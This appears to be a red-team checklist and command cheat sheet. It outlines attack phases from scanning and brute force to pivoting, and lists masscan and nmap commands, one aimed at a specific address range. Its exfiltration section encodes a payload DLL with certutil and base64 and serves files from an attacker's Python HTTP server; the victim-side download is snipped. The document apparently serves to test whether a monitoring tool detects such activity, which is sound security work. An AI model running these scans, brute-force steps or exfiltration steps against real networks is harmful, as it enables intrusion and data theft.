1) Scan for vuls
	1) Nessus
	2) OpenVAS

2) Discovery
	1) SYN
	2) Full Port scan
	3) Brute-force login
		1) Observe if ExtraHop able to identify any successful brute force
	4) Weak/vul service discovered/exploited/access
	5) Outside hour operation
	6) Keeping access alive (refreshing access of high priv account for later exploit)
3) Lateral Movement
4) Tunneling 
	1) SSH
	2) Custom port
5) Steganography (hide malicious data within images/docs)

6) Metasploit

7) A new device plugged into the network
	1) Raspberry pi with automated script to perform slow scans, resource discovery, slow credentials brute force
8) Within AD
	1) Identifying misconfigured assets/policies
9) Internal Network Pivoting
	1) Low priv account logged-in to another machine with High priv
10) Exfilration
	1) https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration
11) Living-of-the-land
	1) Upload binary file



****

## Discovering hosts from the outside


```
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```

TCP

```
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```


UDP

```
nmap -sU -sV --version-intensity 0 -F -n <IP>/24
```


Passive Discovery

```
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```


## Scanning Host

TCP

```
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP> 

# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP> 

# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```

UDP

```
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP> 

# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>

# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP> 

# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>

# You could use nmap to test all the UDP ports, but that will take a lot of time
```



## Exfiltration

Linux

```
base64 -w0 <file> #Encode file
base64 -d file #Decode file**
```

Windows

```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```


HTTP connection from internal host to attacker

Python simple server

```
python3 -m http.server
```

Vic

```
wget .... <snipped>
```

1) hide message in images
2) Send to attacker / download image contained within the image